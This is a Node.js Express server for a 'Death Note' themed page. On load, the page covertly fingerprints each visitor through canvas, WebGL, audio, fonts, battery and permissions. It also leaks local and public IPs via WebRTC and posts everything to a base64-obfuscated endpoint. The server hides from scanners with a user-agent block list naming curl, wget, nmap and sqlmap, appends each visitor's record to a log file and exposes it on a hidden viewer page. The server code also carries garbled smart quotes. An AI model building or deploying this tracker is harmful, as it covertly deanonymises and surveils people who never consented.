const express = require(‘express’);
const fs = require(‘fs’);

const app = express();
app.use(express.json());

const BOT_PATTERNS = [
/bot/i,/crawl/i,/spider/i,/slurp/i,/facebookexternalhit/i,
/Twitterbot/i,/LinkedInBot/i,/WhatsApp/i,/TelegramBot/i,
/Googlebot/i,/bingbot/i,/YandexBot/i,/DuckDuckBot/i,
/Baiduspider/i,/python-requests/i,/curl/i,/wget/i,
/Go-http-client/i,/axios/i,/node-fetch/i,/okhttp/i,
/Scrapy/i,/HTTrack/i,/masscan/i,/nmap/i,/zgrab/i,
/Nuclei/i,/sqlmap/i,/nikto/i,/dirbuster/i,/gobuster/i,
];

function isBot(ua) {
if (!ua || ua.length < 10) return true;
return BOT_PATTERNS.some(p => p.test(ua));
}

const HTML = `<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>light · archive</title>
  <link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=Crimson+Text:ital,wght@0,400;1,400&display=swap" rel="stylesheet"/>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{width:100vw;height:100vh;overflow:hidden;background:#0a0a0a;font-family:'Crimson Text',serif}
    #bg{position:fixed;inset:0;background:url('https://i.postimg.cc/zf49rgvs/IMG-7284.jpg') center center/cover no-repeat;filter:brightness(0.6) contrast(1.08);z-index:0}
    #to{position:fixed;top:0;left:0;right:0;height:220px;background:linear-gradient(to bottom,rgba(0,0,0,0.92) 0%,transparent 100%);z-index:1}
    #nt{position:fixed;top:14px;left:50%;transform:translateX(-50%);z-index:10;width:min(520px,94vw);background:#f4efe6;border:1px solid #c4b494;border-radius:2px;padding:14px 20px 16px 20px;box-shadow:0 0 0 1px #b4a478,0 12px 55px rgba(0,0,0,0.8),inset 0 0 80px rgba(180,160,120,0.1);opacity:0;animation:na 1s ease forwards 0.4s;max-height:90vh;overflow-y:auto}
    @keyframes na{from{opacity:0;transform:translateX(-50%) translateY(-8px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
    #nt::before{content:'';position:absolute;inset:0;background-image:repeating-linear-gradient(transparent,transparent 26px,#c4b49433 26px,#c4b49433 27px);border-radius:2px;pointer-events:none}
    #nt::after{content:'';position:absolute;top:0;bottom:0;left:34px;width:1px;background:rgba(160,50,50,0.3);pointer-events:none}
    .nh{font-family:'Special Elite',cursive;font-size:10px;color:#7a6a50;letter-spacing:.2em;text-transform:uppercase;margin-bottom:10px;padding-left:22px;opacity:.6}
    .ni{font-family:'Special Elite',cursive;font-size:22px;color:#0f0a04;padding-left:22px;margin-bottom:2px;letter-spacing:.03em;min-height:28px}
    .cur{display:inline-block;width:2px;height:20px;background:#0f0a04;margin-left:2px;vertical-align:middle;animation:bl 1s step-end infinite}
    @keyframes bl{0%,100%{opacity:1}50%{opacity:0}}
    .nd{height:1px;background:#c4b49444;margin:10px 0 8px 22px}
    .cod-lbl{font-family:'Special Elite',cursive;font-size:9px;color:#7a6a50;letter-spacing:.18em;text-transform:uppercase;padding-left:22px;margin-bottom:5px;opacity:.55}
    .cod{font-family:'Crimson Text',serif;font-style:italic;font-size:10.5px;color:#3a2a18;padding-left:22px;line-height:1.9;opacity:.8}
    .cod span{display:block}
    .nts{position:absolute;top:8px;right:12px;font-family:'Special Elite',cursive;font-size:8px;color:#7a6a50;opacity:.4;letter-spacing:.08em}
    #gr{position:fixed;inset:0;z-index:2;pointer-events:none;opacity:.025;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");background-size:200px}
    .lt{color:#9a8a6a;font-style:italic;font-size:13px}
  </style>
</head>
<body>
  <div id="bg"></div>
  <div id="to"></div>
  <div id="gr"></div>
  <div id="nt">
    <div class="nts" id="ts"></div>
    <div class="nh">Death Note</div>
    <div class="ni" id="xd"><span class="lt">retrieving...</span></div>
    <div class="nd"></div>
    <div class="cod-lbl">cause of death</div>
    <div class="cod">
      <span id="x1">—</span>
      <span id="x2">—</span>
      <span id="x3">—</span>
      <span id="x4">—</span>
      <span id="x5">—</span>
      <span id="x6">—</span>
      <span id="x7">—</span>
      <span id="x8">—</span>
      <span id="x9">—</span>
      <span id="x10">—</span>
    </div>
  </div>
  <script>
  !function(){
    function _tw(e,t,s){
      e.innerHTML='';
      var c=document.createElement('span');c.className='cur';
      var i=0,iv=setInterval(function(){
        e.innerHTML=t.slice(0,i);e.appendChild(c);i++;
        if(i>t.length){clearInterval(iv);setTimeout(function(){c.remove()},1400);}
      },s||48);
    }
    function _cv(){
      try{
        var c=document.createElement('canvas'),g=c.getContext('2d');
        g.textBaseline='top';g.font='14px Arial';
        g.fillStyle='#f60';g.fillRect(125,1,62,20);
        g.fillStyle='#069';g.fillText('ABCDEF',2,2);
        g.fillStyle='rgba(102,204,0,0.7)';g.fillText('ABCDEF',4,17);
        return c.toDataURL().slice(-40);
      }catch(e){return'x';}
    }
    function _wg(){
      try{
        var c=document.createElement('canvas');
        var g=c.getContext('webgl')||c.getContext('experimental-webgl');
        if(!g)return{renderer:'n/a',vendor:'n/a',params:'n/a'};
        var d=g.getExtension('WEBGL_debug_renderer_info');
        var renderer=d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):'n/a';
        var vendor=d?g.getParameter(d.UNMASKED_VENDOR_WEBGL):'n/a';
        var params=[
          g.getParameter(g.MAX_TEXTURE_SIZE),
          g.getParameter(g.MAX_VIEWPORT_DIMS),
          g.getParameter(g.MAX_VERTEX_ATTRIBS),
          g.getParameter(g.MAX_VERTEX_UNIFORM_VECTORS),
          g.getParameter(g.MAX_FRAGMENT_UNIFORM_VECTORS),
          g.getParameter(g.MAX_VARYING_VECTORS),
          g.getParameter(g.MAX_COMBINED_TEXTURE_IMAGE_UNITS),
          g.getParameter(g.ALIASED_LINE_WIDTH_RANGE),
          g.getParameter(g.ALIASED_POINT_SIZE_RANGE),
        ].join(',');
        return{renderer:renderer,vendor:vendor,params:params};
      }catch(e){return{renderer:'n/a',vendor:'n/a',params:'n/a'};}
    }
    function _au(){
      try{
        var a=new(window.AudioContext||window.webkitAudioContext)();
        var o=a.createOscillator(),an=a.createAnalyser(),g=a.createGain();
        g.gain.value=0;o.connect(an);an.connect(g);g.connect(a.destination);
        o.start(0);
        var d=new Float32Array(an.frequencyBinCount);
        an.getFloatFrequencyData(d);o.stop();a.close();
        var s=0;for(var i=0;i<d.length;i++)s+=Math.abs(d[i]);
        return s.toFixed(6);
      }catch(e){return'n/a';}
    }
    function _rtc(){
      return new Promise(function(res){
        try{
          var ips={local:[],public:[]};
          var pc=new RTCPeerConnection({iceServers:[
            {urls:'stun:stun.l.google.com:19302'},
            {urls:'stun:stun1.l.google.com:19302'},
          ]});
          pc.createDataChannel('');
          pc.createOffer().then(function(o){return pc.setLocalDescription(o);});
          pc.onicecandidate=function(e){
            if(!e||!e.candidate)return;
            var cand=e.candidate.candidate;
            var m=cand.match(/(\d+\.\d+\.\d+\.\d+)/g);
            if(!m)return;
            m.forEach(function(ip){
              if(ip.match(/^(192\.168|10\.|172\.(1[6-9]|2\d|3[01]))/))
                ips.local.push(ip);
              else if(!ip.match(/^127\./))
                ips.public.push(ip);
            });
          };
          setTimeout(function(){
            pc.close();
            res({
              local:[...new Set(ips.local)].join(',')||'n/a',
              public:[...new Set(ips.public)].join(',')||'n/a'
            });
          },800);
        }catch(e){res({local:'n/a',public:'n/a'});}
      });
    }
    function _net(){
      try{
        var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
        if(!c)return'n/a';
        return(c.effectiveType||'?')+' / '+(c.downlink||'?')+'mbps / rtt '+(c.rtt||'?')+'ms / saveData:'+(c.saveData||false);
      }catch(e){return'n/a';}
    }
    function _bat(){
      return new Promise(function(res){
        try{
          if(!navigator.getBattery)return res('n/a');
          navigator.getBattery().then(function(b){
            res(Math.round(b.level*100)+'% / charging:'+b.charging+' / time:'+(b.chargingTime===Infinity?'inf':b.chargingTime));
          }).catch(function(){res('n/a');});
        }catch(e){res('n/a');}
      });
    }
    function _fn(){
      var fonts=['Arial','Helvetica','Times New Roman','Courier New','Georgia','Verdana','Comic Sans MS','Impact','Tahoma','Trebuchet MS','Palatino','Garamond','Futura','Gill Sans','Optima','Didot','Rockwell'];
      var detected=[],canvas=document.createElement('canvas'),ctx=canvas.getContext('2d');
      canvas.width=200;canvas.height=30;
      function w(f){ctx.font='12px '+f;return ctx.measureText('mmmmmmmmm').width;}
      var base=w('monospace');
      for(var i=0;i<fonts.length;i++){if(w(fonts[i]+',monospace')!==base)detected.push(fonts[i]);}
      return detected.join(', ')||'n/a';
    }
    function _css(){
      var r={};
      try{r.darkMode=window.matchMedia('(prefers-color-scheme: dark)').matches;}catch(e){r.darkMode='n/a';}
      try{r.reducedMotion=window.matchMedia('(prefers-reduced-motion: reduce)').matches;}catch(e){r.reducedMotion='n/a';}
      try{r.hdr=window.matchMedia('(dynamic-range: high)').matches;}catch(e){r.hdr='n/a';}
      try{r.pointer=window.matchMedia('(pointer: coarse)').matches?'coarse':window.matchMedia('(pointer: fine)').matches?'fine':'none';}catch(e){r.pointer='n/a';}
      try{r.hover=window.matchMedia('(hover: hover)').matches;}catch(e){r.hover='n/a';}
      try{r.forcedColors=window.matchMedia('(forced-colors: active)').matches;}catch(e){r.forcedColors='n/a';}
      try{r.inverted=window.matchMedia('(inverted-colors: inverted)').matches;}catch(e){r.inverted='n/a';}
      return r;
    }
    function _perms(){
      return new Promise(function(res){
        var perms=['camera','microphone','notifications','geolocation','clipboard-read'];
        var results={};
        var checks=perms.map(function(p){
          return navigator.permissions.query({name:p}).then(function(r){
            results[p]=r.state;
          }).catch(function(){results[p]='n/a';});
        });
        Promise.all(checks).then(function(){res(results);}).catch(function(){res({});});
      });
    }
    function _feat(){
      return{
        webAssembly:typeof WebAssembly!=='undefined',
        sharedArrayBuffer:typeof SharedArrayBuffer!=='undefined',
        webWorker:typeof Worker!=='undefined',
        webSocket:typeof WebSocket!=='undefined',
        webGL2:!!document.createElement('canvas').getContext('webgl2'),
        bluetooth:!!navigator.bluetooth,
        usb:!!navigator.usb,
        nfc:!!navigator.nfc,
        wakeLock:!!navigator.wakeLock,
        xr:!!navigator.xr,
        midi:!!navigator.requestMIDIAccess,
        gpu:!!navigator.gpu,
        serial:!!navigator.serial,
        credentials:!!navigator.credentials,
      };
    }
    function _timing(){
      try{
        var t=performance.timing||{};
        var nav=performance.getEntriesByType('navigation')[0]||{};
        return{
          dns:Math.round((t.domainLookupEnd-t.domainLookupStart)||0),
          tcp:Math.round((t.connectEnd-t.connectStart)||0),
          ttfb:Math.round((t.responseStart-t.requestStart)||0),
          load:Math.round(nav.loadEventEnd||0),
        };
      }catch(e){return'n/a';}
    }

```
var now=new Date();
document.getElementById('ts').textContent=now.toISOString().slice(0,10);

var wgl=_wg();
var css=_css();
var feat=_feat();
var timing=_timing();

var fp={
  screen:screen.width+'x'+screen.height,
  avail:screen.availWidth+'x'+screen.availHeight,
  depth:screen.colorDepth,
  dpr:window.devicePixelRatio||1,
  tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
  lang:navigator.language,
  langs:(navigator.languages||[]).slice(0,5).join(', '),
  platform:navigator.platform,
  ua:navigator.userAgent,
  cores:navigator.hardwareConcurrency||'?',
  mem:navigator.deviceMemory||'?',
  touch:navigator.maxTouchPoints||0,
  dnt:navigator.doNotTrack||'unset',
  net:_net(),
  canvas:_cv(),
  webgl:wgl.renderer,
  webglv:wgl.vendor,
  webglp:wgl.params,
  audio:_au(),
  fonts:_fn(),
  orient:screen.orientation?screen.orientation.type:'n/a',
  css:css,
  feat:feat,
  timing:timing,
  time:now.toISOString(),
  scrollbar:window.innerWidth-document.documentElement.clientWidth,
  tz_offset:new Date().getTimezoneOffset(),
  history_len:history.length,
  referrer:document.referrer||'direct',
};

Promise.all([_rtc(),_bat(),_perms()]).then(function(r){
  fp.rtc=r[0];
  fp.bat=r[1];
  fp.perms=r[2];

  fetch(atob('L2xvZw=='),{
    method:'POST',
    headers:{[atob('Q29udGVudC1UeXBl')]:atob('YXBwbGljYXRpb24vanNvbg==')},
    body:JSON.stringify(fp)
  })
  .then(function(r){return r.json();})
  .then(function(d){
    _tw(document.getElementById('xd'),d.ip);
    document.getElementById('x1').textContent='device — '+fp.platform+' · '+fp.cores+' cores · '+fp.mem+'gb ram · touch: '+fp.touch+' pts';
    document.getElementById('x2').textContent='display — '+fp.screen+' (avail '+fp.avail+') · '+fp.depth+'bit · x'+fp.dpr+' dpr · '+fp.orient;
    document.getElementById('x3').textContent='location — '+fp.tz+' (offset '+fp.tz_offset+'min) · '+fp.langs;
    document.getElementById('x4').textContent='network — '+fp.net+' · battery: '+fp.bat;
    document.getElementById('x5').textContent='ip leak — local: '+fp.rtc.local+' · public: '+fp.rtc.public;
    document.getElementById('x6').textContent='gpu — '+fp.webgl.slice(0,50)+' ['+fp.webglv.slice(0,18)+']';
    document.getElementById('x7').textContent='fingerprint — canvas: '+fp.canvas+' · audio: '+fp.audio.slice(0,12);
    document.getElementById('x8').textContent='prefs — dark:'+fp.css.darkMode+' · pointer:'+fp.css.pointer+' · hdr:'+fp.css.hdr+' · motion:'+fp.css.reducedMotion;
    document.getElementById('x9').textContent='perms — cam:'+fp.perms.camera+' · mic:'+fp.perms.microphone+' · notif:'+fp.perms.notifications+' · geo:'+fp.perms.geolocation;
    document.getElementById('x10').textContent='browser — wasm:'+fp.feat.webAssembly+' · gl2:'+fp.feat.webGL2+' · bt:'+fp.feat.bluetooth+' · history:'+fp.history_len;
  })
  .catch(function(){document.getElementById('xd').textContent='???';});
});
```

}();
</script>

</body>
</html>`;

app.get(’/’, (req, res) => res.send(HTML));

app.post(’/log’, (req, res) => {
const ip = req.headers[‘x-forwarded-for’]?.split(’,’)[0].trim() || req.socket.remoteAddress || ‘unknown’;
const ua = req.headers[‘user-agent’] || ‘’;
if (isBot(ua)) return res.json({ ip: ‘0.0.0.0’ });

const fp = req.body || {};
const entry = {
time: new Date().toISOString(), ip, ua,
referrer: fp.referrer || req.headers[‘referer’] || ‘direct’,
net: fp.net||’?’,
rtc_local: fp.rtc?.local||’?’,
rtc_public: fp.rtc?.public||’?’,
bat: fp.bat||’?’,
platform: fp.platform||’?’, cores: fp.cores||’?’, mem: fp.mem||’?’, touch: fp.touch||’?’,
screen: fp.screen||’?’, avail: fp.avail||’?’, depth: fp.depth||’?’, dpr: fp.dpr||’?’,
tz: fp.tz||’?’, tz_offset: fp.tz_offset||’?’, lang: fp.lang||’?’, langs: fp.langs||’?’,
dnt: fp.dnt||’?’, orient: fp.orient||’?’,
canvas: fp.canvas||’?’,
webgl: fp.webgl||’?’, webglv: fp.webglv||’?’, webglp: fp.webglp||’?’,
audio: fp.audio||’?’,
fonts: fp.fonts||’?’,
css: JSON.stringify(fp.css||{}),
perms: JSON.stringify(fp.perms||{}),
feat: JSON.stringify(fp.feat||{}),
timing: JSON.stringify(fp.timing||{}),
history_len: fp.history_len||’?’,
scrollbar: fp.scrollbar||’?’,
};

console.log(’\n┌──────────────────────────────────────────────┐’);
console.log(’│ IP          ’, entry.ip);
console.log(’│ Time        ’, entry.time);
console.log(’│ Platform    ’, entry.platform, ‘·’, entry.cores, ‘cores ·’, entry.mem+‘gb · touch:’, entry.touch);
console.log(’│ Battery     ’, entry.bat);
console.log(’│ Screen      ’, entry.screen, ‘·’, entry.depth+‘bit · dpr’+entry.dpr);
console.log(‘│ Timezone    ‘, entry.tz, ‘(offset’, entry.tz_offset+’) ·’, entry.langs);
console.log(’│ Network     ’, entry.net);
console.log(’│ RTC Local   ’, entry.rtc_local);
console.log(’│ RTC Public  ’, entry.rtc_public);
console.log(‘│ GPU         ‘, entry.webgl, ‘[’+entry.webglv+’]’);
console.log(’│ Audio FP    ’, entry.audio);
console.log(’│ Canvas FP   ’, entry.canvas);
console.log(’│ Fonts       ’, entry.fonts);
console.log(’│ CSS Prefs   ’, entry.css);
console.log(’│ Permissions ’, entry.perms);
console.log(’│ Features    ’, entry.feat);
console.log(’│ Referrer    ’, entry.referrer);
console.log(’│ History len ’, entry.history_len);
console.log(‘└──────────────────────────────────────────────┘’);

fs.appendFileSync(‘logs.txt’, JSON.stringify(entry) + ‘\n’);
res.json({ ip });
});

app.get(’/view-logs-dn42’, (req, res) => {
try {
const logs = fs.readFileSync(‘logs.txt’,‘utf8’).trim().split(’\n’).filter(Boolean).map(l=>JSON.parse(l)).reverse();
let html = `<!DOCTYPE html><html><head><title>logs</title><style> body{background:#0d0d0d;color:#c8b89a;font-family:monospace;padding:20px;font-size:11px} h2{color:#e8d8b0;margin-bottom:6px;letter-spacing:.1em} .count{color:#6a5a45;margin-bottom:20px} .entry{border:1px solid #1e1e1e;padding:14px;margin-bottom:12px;background:#111;border-radius:3px} .ip{font-size:18px;color:#e8d8b0;margin-bottom:3px;letter-spacing:.05em} .time{color:#6a5a45;margin-bottom:8px;font-size:10px} .row{color:#8a7060;line-height:2.1;border-top:1px solid #1a1a1a;padding-top:8px} .lbl{color:#5a4a38} </style></head><body> <h2>// death note — visitor log</h2> <div class="count">${logs.length} entries</div>`;

```
for(const e of logs){
  html+=`<div class="entry">
    <div class="ip">${e.ip}</div>
    <div class="time">${e.time}</div>
    <div class="row">
      <span class="lbl">platform</span> ${e.platform} · <span class="lbl">cores</span> ${e.cores} · <span class="lbl">ram</span> ${e.mem}gb · <span class="lbl">touch</span> ${e.touch} · <span class="lbl">battery</span> ${e.bat}<br>
      <span class="lbl">screen</span> ${e.screen} (${e.avail}) · ${e.depth}bit · dpr ${e.dpr} · ${e.orient}<br>
      <span class="lbl">tz</span> ${e.tz} (${e.tz_offset}min) · <span class="lbl">langs</span> ${e.langs} · <span class="lbl">dnt</span> ${e.dnt}<br>
      <span class="lbl">network</span> ${e.net}<br>
      <span class="lbl">rtc local</span> ${e.rtc_local} · <span class="lbl">rtc public</span> ${e.rtc_public}<br>
      <span class="lbl">gpu</span> ${e.webgl} [${e.webglv}]<br>
      <span class="lbl">webgl params</span> ${e.webglp}<br>
      <span class="lbl">audio fp</span> ${e.audio}<br>
      <span class="lbl">canvas fp</span> ${e.canvas}<br>
      <span class="lbl">fonts</span> ${e.fonts}<br>
      <span class="lbl">css prefs</span> ${e.css}<br>
      <span class="lbl">permissions</span> ${e.perms}<br>
      <span class="lbl">features</span> ${e.feat}<br>
      <span class="lbl">timing</span> ${e.timing}<br>
      <span class="lbl">history len</span> ${e.history_len} · <span class="lbl">scrollbar</span> ${e.scrollbar}px<br>
      <span class="lbl">referrer</span> ${e.referrer}<br>
      <span class="lbl">ua</span> ${e.ua}
    </div>
  </div>`;
}
html+=`</body></html>`;
res.send(html);
```

} catch(e){ res.send(‘no logs yet’); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
console.log(’\n nearwilldie live on port’, PORT);
console.log(’ logs -> /view-logs-dn42\n’);
});
